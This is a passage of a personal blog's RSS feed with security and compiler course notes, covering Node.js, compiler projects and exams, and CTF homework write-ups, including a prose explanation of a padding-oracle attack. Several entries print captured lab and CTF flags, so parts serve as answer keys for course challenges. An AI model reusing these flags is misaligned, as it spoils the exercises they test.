b&amp;#39;synt: AVFEN{N_eNf7RE_6E4CU1P_eRcERfRAg$_N_Gj0-Q1Z3af10a41_cvpghEr_Nf_4_eRpGna6H1NE_Zn7evk_be_teVq_bS_FdH@eR_CVKryf}&amp;#39;
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>NISRA{A_rAs7ER_6R4PH1C_rEpREsENt$_A_Tw0-D1M3ns10n41_pictuRe_As_4_rEcTan6U1AR_Ma7rix_or_grId_oF_SqU@rE_PIXels}&lt;/code>&lt;/p></description></item><item><title>Node Related</title><link>https://bernie6401.github.io/docs/terminology/node-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/node-related/</guid><description>&lt;h1 id="node-related">
 Node Related
 &lt;a class="anchor" href="#node-related">#&lt;/a>
&lt;/h1>
&lt;h2 id="what-is-nodejs">
 What is Node.JS
 &lt;a class="anchor" href="#what-is-nodejs">#&lt;/a>
&lt;/h2>
&lt;p>&lt;strong>Node.js&lt;/strong> 是一個基於 Chrome V8 引擎的 JavaScript 運行環境，最初由 Ryan Dahl 於 2009 年開發，用於讓開發者在服務器端運行 JavaScript 代碼。它突破了 JavaScript 只能在瀏覽器端運行的限制，從而可以用 JavaScript 構建完整的後端應用。&lt;/p>
&lt;h3 id="nodejs-的核心特點">
 Node.js 的核心特點
 &lt;a class="anchor" href="#nodejs-%e7%9a%84%e6%a0%b8%e5%bf%83%e7%89%b9%e9%bb%9e">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>事件驅動和非阻塞 I/O 模型&lt;/strong>：Node.js 采用事件驅動和非阻塞 I/O（異步 I/O）模型，這使得它非常適合處理高並發的網絡請求。它不會像傳統的阻塞 I/O 那樣等待數據返回，而是直接執行下一步操作，這大大提高了性能和效率。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>單線程架構&lt;/strong>：Node.js 使用單線程來處理所有請求。雖然這看似會限制並發性，但因為它的非阻塞 I/O 模型，這樣的架構仍然能高效處理大量請求。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>基於 V8 引擎&lt;/strong>：V8 是 Google 開發的一個非常快的 JavaScript 引擎，能夠將 JavaScript 編譯成高效的機器碼，顯著提高了 Node.js 的執行速度。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>豐富的包管理系統（npm）&lt;/strong>：Node.js 附帶 npm (Node Package Manager)，這是一個巨大的生態系統，提供了成千上萬的開源包，可以很方便地引入到項目中，快速實現各種功能。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="nodejs-的主要應用場景">
 Node.js 的主要應用場景
 &lt;a class="anchor" href="#nodejs-%e7%9a%84%e4%b8%bb%e8%a6%81%e6%87%89%e7%94%a8%e5%a0%b4%e6%99%af">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>&lt;strong>RESTful API 和微服務&lt;/strong>：Node.js 非常適合構建輕量、快速響應的 API 服務，可以和前端應用進行良好的交互。&lt;/li>
&lt;li>&lt;strong>實時應用&lt;/strong>：例如聊天應用、在線遊戲等，需要高頻交互的場景。&lt;/li>
&lt;li>&lt;strong>數據流處理&lt;/strong>：例如處理實時流數據的應用，可以通過 Node.js 輕松實現。&lt;/li>
&lt;li>&lt;strong>單頁應用（SPA）&lt;/strong>：Node.js 經常和前端框架（如 React、Angular、Vue）一起使用，構建單頁應用的後端。&lt;/li>
&lt;/ol>
&lt;h3 id="nodejs-的優缺點">
 Node.js 的優缺點
 &lt;a class="anchor" href="#nodejs-%e7%9a%84%e5%84%aa%e7%bc%ba%e9%bb%9e">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>優點&lt;/strong>：&lt;/p></description></item><item><title>NTU CNS Final Project Proposal</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/ntu-cns-final-project-proposal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/ntu-cns-final-project-proposal/</guid><description>&lt;h1 id="ntu-cns-final-project-proposal">
 NTU CNS Final Project Proposal
 &lt;a class="anchor" href="#ntu-cns-final-project-proposal">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;h2 id="problem-description--research-question秉學">
 Problem description / Research question(秉學)
 &lt;a class="anchor" href="#problem-description--research-question%e7%a7%89%e5%ad%b8">#&lt;/a>
&lt;/h2>
&lt;h3 id="terminology">
 Terminology
 &lt;a class="anchor" href="#terminology">#&lt;/a>
&lt;/h3>
&lt;p>Federated Learning is a decentralized machine learning method that enables training models without exposing data. Traditional machine learning methods require all data to be centralized in one location for training, but Federated Learning enables models to be trained on many distributed devices, such as smartphones, tablets, or embedded devices, with each device training its own local data. This greatly reduces data transmission and storage requirements and better protects user privacy.&lt;/p></description></item><item><title>NTU Compiler Technology Previous Exam 2019 Spring</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/</guid><description>&lt;h1 id="ntu-compiler-technology-previous-exam-2019-spring">
 NTU Compiler Technology Previous Exam 2019 Spring
 &lt;a class="anchor" href="#ntu-compiler-technology-previous-exam-2019-spring">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Final Exam&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">#&lt;/a>
&lt;/h6>
&lt;ol>
&lt;li>
&lt;p>Please explain three different compiler optimization techniques :
(a) 1st compiler optimization technique: (5points/5)
(b) 2nd compiler optimization technique: (5points/10)
(c) 3rd compiler optimization techniques: (5points/15)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Many computer systems provide an interactive debugger (for example, &lt;code>gdb&lt;/code> or db x) to assist users in diagnosing and correcting runtime errors. Although a debugger is run long after a compiler has done its job, the two tools still must cooperate. What information (beyond the translation of a program) must a compiler supply to support effective runtime debugging? (5 points/20)&lt;/p></description></item><item><title>NTU Compiler Technology Previous Exam 2020 Spring</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/</guid><description>&lt;h1 id="ntu-compiler-technology-previous-exam-2020-spring">
 NTU Compiler Technology Previous Exam 2020 Spring
 &lt;a class="anchor" href="#ntu-compiler-technology-previous-exam-2020-spring">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Final Exam&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-final-exam">#&lt;/a>
&lt;/h6>
&lt;ol>
&lt;li>
&lt;p>According to the grammar of AC in the right , please write down the recursive descent parsing procedure for nonterminal Expr. (10 points/10)
&lt;img src="https://imgur.com/fIUehwA.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Please write down a regular expression that defines the set of strings recognized by the FA in the following and explain your answer (5points/ 15)
&lt;img src="https://imgur.com/oWs2kC0.png" alt="" />&lt;/p></description></item><item><title>NTU Compiler Technology Project 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-1/</guid><description>&lt;h1 id="ntu-compiler-technology-project-1">
 NTU Compiler Technology Project 1
 &lt;a class="anchor" href="#ntu-compiler-technology-project-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language">#&lt;/a>
&lt;/h6>
&lt;h2 id="acdc-compiler">
 AcDc Compiler
 &lt;a class="anchor" href="#acdc-compiler">#&lt;/a>
&lt;/h2>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is a project from NTU (National Taiwan University) course, Compiler Technology of Programming Language.&lt;/li>
&lt;li>First project is aim to
&lt;ul>
&lt;li>add multiplier and division operation in this compiler&lt;/li>
&lt;li>let compiler can recognize multi character identifier(variable) name by alphabet string&lt;/li>
&lt;li>use constant folding to optimize the statement&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="how-to-use">
 How to use?
 &lt;a class="anchor" href="#how-to-use">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>You can browse Assignment1.pdf. You must run in Linux OS environment(more conveniently). When you finish the coding, use &lt;code>$ make&lt;/code> command directly.&lt;/li>
&lt;li>&lt;code>$ ./AcDc &amp;lt;input sample address&amp;gt; &amp;lt;output file address&amp;gt;&lt;/code>
&lt;ul>
&lt;li>For instance: &lt;code>$ ./AcDc ../test/sample1.ac ./output&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="something-need-to-know-first">
 Something need to know first
 &lt;a class="anchor" href="#something-need-to-know-first">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>It can not recognize the bottom line as identifier name.&lt;/li>
&lt;li>It can not print negative value like $1-2=-1$ expression. Actually speaking, it can calculate correctly but it can not print it out.(I&amp;rsquo;ll check it out later.)
&lt;ul>
&lt;li>You can check &lt;a href="https://bernie6401.github.io/test/constfold.ac">constfold testbench&lt;/a>&lt;/li>
&lt;li>Solution and Why: In Dc Language, the bottom line represent negative symbol. You can not just use minus as negative symbol, replace it by bottom line instead.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>It can not recognize identifier name with numbers. You can check &lt;a href="https://bernie6401.github.io/test/longname.ac">longname.ac&lt;/a>&lt;/li>
&lt;li>The other testbenchs can compile from Ac language to Dc language correctly.&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/jaidTw/AcDc">AcDc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/ZephyrZhuQi/AcDcCompiler">AcDcCompiler&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>NTU Compiler Technology Project 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-2/</guid><description>&lt;h1 id="ntu-compiler-technology-project-2">
 NTU Compiler Technology Project 2
 &lt;a class="anchor" href="#ntu-compiler-technology-project-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-scanner">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Scanner&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-scanner">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="objective">
 Objective
 &lt;a class="anchor" href="#objective">#&lt;/a>
&lt;/h2>
&lt;p>This is compiler project 2 that aim to construct the scanner by handmade with some sample code. The output is symbol table that the frequency of each identifier and the result is sorted.&lt;/p>
&lt;h2 id="run-and-test">
 Run and Test
 &lt;a class="anchor" href="#run-and-test">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ make /*use make in src folder*/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./scanner ../test/sample1.ac
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output-of-each-sample">
 Output of each sample
 &lt;a class="anchor" href="#output-of-each-sample">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>For sample1.ac&lt;/p></description></item><item><title>NTU Compiler Technology Project 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-3/</guid><description>&lt;h1 id="ntu-compiler-technology-project-3">
 NTU Compiler Technology Project 3
 &lt;a class="anchor" href="#ntu-compiler-technology-project-3">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-yacc-lex">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>YACC&lt;/code> &lt;code>Lex&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-yacc-lex">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="objective">
 Objective
 &lt;a class="anchor" href="#objective">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>The main task for this project is to revise &lt;code>src/parser.y&lt;/code> and generate &lt;code>parser&lt;/code> file properly to compile test code in &lt;code>test&lt;/code> folder.&lt;/li>
&lt;li>And then use &lt;code>Graphviz&lt;/code> command to visualize the structure of these test code&lt;/li>
&lt;/ul>
&lt;h2 id="how-to-run">
 How to run?
 &lt;a class="anchor" href="#how-to-run">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Just use &lt;code>make&lt;/code> to compile all files in &lt;code>/src&lt;/code>. Though you&amp;rsquo;ll get a lots of warning shown as below, you can ignore them and obtain the target file &lt;code>parser&lt;/code>.
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">bison -v -d parser.y
parser.y: warning: 1 shift/reduce conflict [-Wconflicts-sr]
flex lexer.l
gcc -g -c alloc.c
gcc -g -c parser.tab.c
parser.tab.c: In function ‘yyparse’:
parser.tab.c:2565:7: warning: implicit declaration of function ‘yyerror’; did you mean ‘yyerrok’? [-Wimplicit-function-declaration]
 yyerror (YY_(&amp;#34;syntax error&amp;#34;));
 ^~~~~~~
 yyerrok
parser.y: At top level:
parser.y:825:3: warning: data definition has no type or storage class
 yydebug = 1;
 ^~~~~~~
parser.y:825:3: warning: type defaults to ‘int’ in declaration of ‘yydebug’ [-Wimplicit-int]
parser.y:827:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main (argc, argv)
 ^~~~
parser.y: In function ‘main’:
parser.y:834:5: warning: implicit declaration of function ‘printGV’; did you mean ‘printf’? [-Wimplicit-function-declaration]
 printGV(prog, NULL);
 ^~~~~~~
 printf
gcc -g -c functions.c
gcc -g -o parser parser.tab.o alloc.o functions.o -lfl
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Use parser to compile all files in &lt;code>/test&lt;/code> folder and you will get &lt;code>AST_Graph.gv&lt;/code> in &lt;strong>&lt;code>/test&lt;/code>&lt;/strong> folder.
&lt;strong>&lt;code>/src&lt;/code>&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">./parser ../test/control.c
dot -Tpng -o ../test/control.png ../test/AST_Graph.gv
./parser ../test/decl.c
dot -Tpng -o ../test/decl.png ../test/AST_Graph.gv
./parser ../test/expr.c
dot -Tpng -o ../test/expr.png ../test/AST_Graph.gv
./parser ../test/func.c
dot -Tpng -o ../test/func.png ../test/AST_Graph.gv
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Note that in &lt;code>parser.y&lt;/code>, I set &lt;code>yydebug = 1&lt;/code> so that we can see the debug message from parser
&lt;pre tabindex="0">&lt;code class="language-cpp=821" data-lang="cpp=821">#ifdef YYDEBUG
 yydebug = 1;
#endif
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="for-ta">
 For TA
 &lt;a class="anchor" href="#for-ta">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>I changed a little bit &lt;code>functions.c&lt;/code> that will generate &lt;code>AST_Graph.gv&lt;/code> at &lt;code>test/&lt;/code> folder.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-cpp=150" data-lang="cpp=150">void printGV(AST_NODE *root, char* fileName)
{
 if (fileName == NULL) {
 fileName = &amp;#34;../test/AST_Graph.gv&amp;#34;;
 }
 ...
}
&lt;/code>&lt;/pre>&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>You can see the relationship between structure map and test code by yourself.&lt;/li>
&lt;li>&lt;strong>control.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int main()
{
 int i;
 int p;
 int k, j;
 for (i=0; i&amp;lt;9; i=i+1) {
 /* empty */
 }
 for (i=0, p=4+4; i&amp;lt;9; i=i+1, p=i) {
 write(&amp;#34;test&amp;#34;);
 }
 for (;;) {
 /*empty*/
 }
 while (1) {
 }
 while (2) {
 write(&amp;#34;haha&amp;#34;);
 write(&amp;#34;wow&amp;#34;);
 }
 if (k == j) {
 write(&amp;#34;first&amp;#34;);
 }
 if (k == j) {
 write(&amp;#34;first&amp;#34;);
 } else if (j == k) {
 write(&amp;#34;second&amp;#34;);
 } else {
 write(&amp;#34;third&amp;#34;);
 }
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/4zTAsML.png" alt="graphviz of control.c" />&lt;/li>
&lt;li>&lt;strong>decl.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">typedef float GFLOAT;
int main() {
 typedef int INT, INT2, INT3;
 typedef float FLOAT;
 typedef void VOID;
 typedef void VOID2, VOID3;
 INT f[3][3*3-(4+2)/2];
 FLOAT f2;
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/6KWV4IT.png" alt="graphviz of decl.c" />&lt;/li>
&lt;li>&lt;strong>expr.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int fn1() {
 return 1;
}
float fn3() {
 return 1.0;
}
int fn4(int a, int b) {
 return 1;
}
int expr(int a, int b, int c, int d,
 float fa, float fb, float fc) {
 int i, j, k, l;
 float fi = 1.0, fj = 2.0, fk = 3.0, fl = 4.0;

 fi = 1.2*fi + -fj * (fl - fk * fn3());
 fi = -fn3() -(-(-(4)));
 fi = !fn3() -(!(!(4)));
 i = !fn1();
 i = 1 &amp;lt; 2;
 i = 1 &amp;gt; 2;
 i = 1 &amp;gt;= 2;
 i = 1 &amp;lt;= 2;
 i = 1 != 2;
 i = 1 == 2;
 i = fn4(1+3*4*fn4(2,3), 3);
 return 1;
}
int main() {
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/7a6OyJA.png" alt="graphviz of expr.c" />&lt;/li>
&lt;li>&lt;strong>func.c&lt;/strong>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int fn1() {
 int ABC = 5;
 return ABC+5;
}
void fn2() {
}
void fn3(int a, int b[3][4]) {
}
int main() {
 int b[4][4];
 fn1();
 fn2();
 fn3(2, b);
}
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/BvW5b2U.png" alt="graphviz of func.c" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/liuxt/Compiler/blob/master/hw3">Github example&lt;/a>
&lt;a href="https://bluelove1968.pixnet.net/blog/post/222285652?utm_source=PIXNET&amp;amp;utm_medium=Blog_CollectionEXP_login">Simple intro of yacc &amp;amp; lex&lt;/a>
&lt;a href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/122966CB664D4A17ABAAD11FC2AA887C?page=3">Simple intro of Graphviz&lt;/a>
&lt;a href="https://arcb.csc.ncsu.edu/~mueller/codeopt/codeopt00/y_man.pdf">A GUIDE TO LEX &amp;amp; YACC from TA&lt;/a>
大推：&lt;a href="https://good-ed.blogspot.com/2010/04/lexyacc.html">以lex/yacc實作算式計算機&lt;/a>&lt;/p></description></item><item><title>NTU Compiler Technology Project 4</title><link>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ct/ntu-compiler-technology-project-4/</guid><description>&lt;h1 id="ntu-compiler-technology-project-4">
 NTU Compiler Technology Project 4
 &lt;a class="anchor" href="#ntu-compiler-technology-project-4">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ct-ntu-compiler-techonology-of-programming-language-code-generation">
 tags: &lt;code>NTU_CT&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Compiler Techonology of Programming Language&lt;/code> &lt;code>Code Generation&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ct-ntu-compiler-techonology-of-programming-language-code-generation">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="how-to-run">
 How to run?
 &lt;a class="anchor" href="#how-to-run">#&lt;/a>
&lt;/h2>
&lt;p>First, put your testing file and &lt;code>main.S&lt;/code> to the folder same as &lt;code>parser&lt;/code> file&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ make
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./parser &lt;span style="color:#f92672">[&lt;/span>testing file&lt;span style="color:#f92672">]&lt;/span>.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aarch64-linux-gnu-gcc -static -O0 main.S
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ qemu-aarch64-static ./a.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or, you can put the &lt;code>run.sh&lt;/code> and &lt;code>main.S&lt;/code> in the same directory and run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./run.sh &lt;span style="color:#f92672">[&lt;/span>your parser&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>the C file&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ qemu-aarch64-static ./a.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that you must change your test file&amp;rsquo;s &lt;code>main()&lt;/code> to &lt;font color="FF0000">&lt;code>MAIN()&lt;/code>&lt;/font>&lt;/p></description></item><item><title>NTU CS 2023 HW1 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw1-write-up">
 NTU CS 2023 HW1 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw1-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-cor">
 Lab-COR
 &lt;a class="anchor" href="#lab-cor">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Corre1ati0n_Attack!_!}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:&lt;/p>
&lt;ul>
&lt;li>What we have: 我們有的東西就是密文，所以可以利用它動一些手腳&lt;/li>
&lt;li>Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少&lt;/li>
&lt;li>Our Goal 2: 這樣才可以取得最後的明文69
&lt;img src="https://hackmd.io/_uploads/r1p3yoGlp.png" alt="" />&lt;/li>
&lt;li>How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69
&lt;img src="https://hackmd.io/_uploads/H1yKboMlp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0&amp;hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳&lt;code>Well received :)&lt;/code>代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte&lt;/p>
&lt;h2 id="lab-lsb">
 Lab-LSB
 &lt;a class="anchor" href="#lab-lsb">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路-1">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
&lt;/h3>
&lt;p>這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了&lt;/p></description></item><item><title>NTU CS 2023 HW2 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw2-write-up">
 NTU CS 2023 HW2 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw2-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-hellorevworld">
 Lab-HelloRevWorld
 &lt;a class="anchor" href="#lab-hellorevworld">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{h311O_revers1ng_3ngineer5}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題主要是練習如何把如何把bytes變成字串:&lt;/p>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
